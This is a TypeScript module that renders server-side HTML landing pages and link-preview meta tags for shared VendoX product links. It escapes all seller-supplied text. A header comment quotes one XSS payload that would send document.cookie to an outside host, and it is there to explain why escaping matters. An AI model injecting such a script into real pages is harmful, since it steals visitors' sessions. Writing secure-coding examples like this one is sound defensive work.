/**
 * La página web que ve alguien que abre un enlace compartido.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * ES HTML DEL SERVIDOR PORQUE TIENE QUE SERLO
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Lo que hace útil a un enlace compartido es la previsualización: la imagen del
 * producto, el nombre y el precio apareciendo en el chat de WhatsApp antes de
 * que nadie toque nada. Un enlace pelado se abre muchísimo menos.
 *
 * Y esa previsualización la arma un robot que **no ejecuta JavaScript**. Una
 * página estática que pide los datos al cargar le muestra al robot una página
 * vacía: los `og:` tienen que venir ya escritos en el HTML que responde el
 * servidor.
 *
 * Por eso esto vive en el backend y no en `web/`, que es estático. El backend
 * es el único que tiene los datos en el momento de responder.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * ⚠️ TODO LO QUE ENTRA ACÁ LO ESCRIBIÓ UN VENDEDOR
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * El nombre de un producto, la descripción, el nombre de una tienda: son
 * campos de texto libre que carga cualquiera que abra una cuenta.
 *
 * Un producto llamado `</title><script>fetch('https://…?c='+document.cookie)`
 * en una página armada con concatenación es un XSS servido desde nuestro
 * dominio. Y como estas páginas están hechas para compartirse, el ataque llega
 * solo a donde quiera ir.
 *
 * Por eso hay UNA función que escapa y **todo** el contenido dinámico pasa por
 * ella. No es una precaución: es la razón por la que este archivo existe
 * separado del controlador.
 */

/**
 * Escapa texto para que no pueda salirse de donde está.
 *
 * Los cinco caracteres son los que importan:
 *
 *   · `&` primero, siempre. Si se hiciera después, escaparía las entidades que
 *     acaban de generar los otros reemplazos y `&lt;` se volvería `&amp;lt;`;
 *   · `<` y `>` cierran o abren etiquetas;
 *   · `"` y `'` cierran atributos — y es lo que se olvida, porque en el cuerpo
 *     del documento parecen inofensivos. En `content="…"` de un `<meta>` no lo
 *     son.
 */
export function escapar(texto: string): string {
  return texto
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

/**
 * Recorta un texto para la previsualización.
 *
 * Los previsualizadores cortan alrededor de los 160 caracteres y lo hacen a lo
 * bruto, a mitad de palabra. Cortando acá se puede terminar en un espacio y
 * agregar puntos suspensivos.
 */
export function recortar(texto: string, largo = 155): string {
  const limpio = texto.replace(/\s+/g, ' ').trim();
  if (limpio.length <= largo) return limpio;
  const corte = limpio.slice(0, largo);
  const ultimoEspacio = corte.lastIndexOf(' ');
  return `${ultimoEspacio > largo * 0.6 ? corte.slice(0, ultimoEspacio) : corte}…`;
}

export interface DatosDeLanding {
  /** Lo que va en el título del navegador y en la previsualización. */
  titulo: string;
  descripcion: string;
  /** URL absoluta de la imagen. `null` deja la de la marca. */
  imagen: string | null;
  /** La URL canónica de esta misma página. */
  url: string;
  /** El deep link que abre la app si está instalada. */
  rutaEnLaApp: string;
  /** Precio ya formateado, si aplica. Se muestra grande. */
  precio?: string;
  /** «EN VIVO AHORA», «Agotado». Se muestra como etiqueta. */
  estado?: { texto: string; tono: 'vivo' | 'exito' | 'neutro' };
  /** Nombre de la tienda, si corresponde. */
  tienda?: string;
}

/**
 * El HTML completo.
 *
 * ─── Por qué la página se ve bien y no es sólo un redirector ───
 *
 * Lo fácil sería devolver un `<meta refresh>` a la tienda de aplicaciones. Pero
 * mucha de la gente que abre estos enlaces está en una computadora, o no va a
 * instalar nada para ver un producto que le mandó un amigo.
 *
 * Una página que muestra el producto de verdad —foto, precio, tienda— convierte
 * mejor que una que dice «descargá la app para ver esto». Y quien sí tiene la
 * app instalada nunca ve esta página: el sistema operativo la intercepta antes.
 */
export function paginaDeLanding(d: DatosDeLanding): string {
  const titulo = escapar(d.titulo);
  const descripcion = escapar(recortar(d.descripcion));
  const url = escapar(d.url);
  const imagen = d.imagen ? escapar(d.imagen) : null;

  const colorDelEstado = {
    vivo: '#E6007A',
    exito: '#A3E635',
    neutro: '#6B6B7A',
  };

  return `<!doctype html>
<html lang="es-AR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${titulo} · VendoX</title>
<meta name="description" content="${descripcion}">
<link rel="canonical" href="${url}">

<!-- Open Graph: es lo que arma la previsualización en WhatsApp, Instagram y
     Facebook. Tiene que venir en el HTML del servidor porque el robot que lo
     lee no ejecuta JavaScript. -->
<meta property="og:type" content="${d.precio ? 'product' : 'website'}">
<meta property="og:site_name" content="VendoX">
<meta property="og:locale" content="es_AR">
<meta property="og:title" content="${titulo}">
<meta property="og:description" content="${descripcion}">
<meta property="og:url" content="${url}">
${imagen ? `<meta property="og:image" content="${imagen}">\n<meta property="og:image:alt" content="${titulo}">` : ''}

<!-- Twitter usa sus propias etiquetas y cae a las de Open Graph solo en parte.
     summary_large_image es el formato con la foto grande; sin esto muestra una
     miniatura al costado. -->
<meta name="twitter:card" content="${imagen ? 'summary_large_image' : 'summary'}">
<meta name="twitter:title" content="${titulo}">
<meta name="twitter:description" content="${descripcion}">
${imagen ? `<meta name="twitter:image" content="${imagen}">` : ''}

<!--
  Abre la app si está instalada.

  ⚠️ Esto es un respaldo, no el mecanismo principal. Lo que abre la app de
  verdad son los App Links de Android y los Universal Links de iOS: el sistema
  operativo intercepta el dominio ANTES de que el navegador cargue nada, y
  entonces esta página ni se ve.

  Sirve para el caso en que el enlace se abre dentro del navegador embebido de
  otra app —Instagram, por ejemplo— donde el sistema no intercepta.
-->
<meta property="al:android:package" content="com.vendox.app">
<meta property="al:android:url" content="vendox:/${escapar(d.rutaEnLaApp)}">
<meta property="al:android:app_name" content="VendoX">

<style>
  :root {
    --fondo: #000; --superficie: #121216; --borde: #2A2A34;
    --texto: #F5F5F7; --suave: #A1A1AE; --acento: #6D4AFF; --magenta: #E6007A;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; background: var(--fondo); color: var(--texto);
    font: 16px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    display: flex; flex-direction: column; min-height: 100vh;
  }
  .hoja { max-width: 30rem; margin: 0 auto; padding: 2rem 1.25rem 3rem; width: 100%; flex: 1; }
  .marca {
    font-weight: 800; letter-spacing: -.04em; font-size: 1.35rem;
    background: linear-gradient(90deg, #22D3EE, #6D4AFF, #FF2E9A);
    -webkit-background-clip: text; background-clip: text; color: transparent;
    display: inline-block; margin-bottom: 1.75rem;
  }
  .foto {
    width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 14px;
    background: var(--superficie); display: block; margin-bottom: 1.25rem;
  }
  h1 { font-size: 1.4rem; line-height: 1.25; letter-spacing: -.02em; margin: 0 0 .5rem; }
  .tienda { color: var(--suave); font-size: .95rem; margin: 0 0 1rem; }
  .precio { font-size: 1.9rem; font-weight: 800; letter-spacing: -.03em; margin: 0 0 1rem; }
  .etiqueta {
    display: inline-block; padding: .25rem .7rem; border-radius: 99px;
    font-size: .78rem; font-weight: 700; margin-bottom: 1rem;
  }
  .desc { color: var(--suave); margin: 0 0 2rem; }
  .cta {
    display: block; text-align: center; text-decoration: none; color: #fff;
    background: linear-gradient(90deg, #6D4AFF, #E6007A);
    padding: 1rem; border-radius: 12px; font-weight: 700; font-size: 1.05rem;
  }
  .pie { color: #6B6B7A; font-size: .85rem; text-align: center; padding: 0 1.25rem 2rem; }
  .pie a { color: var(--suave); }
</style>
</head>
<body>
<main class="hoja">
  <div class="marca">VendoX</div>

  ${imagen ? `<img class="foto" src="${imagen}" alt="${titulo}">` : ''}

  ${
    d.estado
      ? `<span class="etiqueta" style="background:${colorDelEstado[d.estado.tono]}22;color:${colorDelEstado[d.estado.tono]}">${escapar(d.estado.texto)}</span>`
      : ''
  }

  <h1>${titulo}</h1>
  ${d.tienda ? `<p class="tienda">${escapar(d.tienda)}</p>` : ''}
  ${d.precio ? `<p class="precio">${escapar(d.precio)}</p>` : ''}
  <p class="desc">${descripcion}</p>

  <a class="cta" href="vendox:/${escapar(d.rutaEnLaApp)}">Abrir en VendoX</a>
</main>

<footer class="pie">
  Comprá mientras lo estás viendo.<br>
  <a href="/privacidad">Privacidad</a>
</footer>
</body>
</html>`;
}

/**
 * La página de «esto ya no está».
 *
 * ⚠️ Devuelve 404 y **no** una página de error del servidor. Un enlace
 * compartido sobrevive a lo que enlaza: un producto se despublica, un vivo
 * termina, una tienda cierra. Que un enlace viejo muestre una pantalla rota es
 * un final peor que el que ya tiene.
 *
 * Tampoco dice *por qué* no está. «Este producto fue despublicado» filtra una
 * decisión del vendedor —o una sanción nuestra— a cualquiera que tenga el
 * enlace.
 */
export function paginaNoEncontrada(url: string): string {
  return paginaDeLanding({
    titulo: 'Esto ya no está disponible',
    descripcion:
      'El enlace que abriste apunta a algo que ya no está en VendoX. ' +
      'Puede que se haya vendido o que el vendedor lo haya dado de baja.',
    imagen: null,
    url,
    rutaEnLaApp: '/',
  });
}
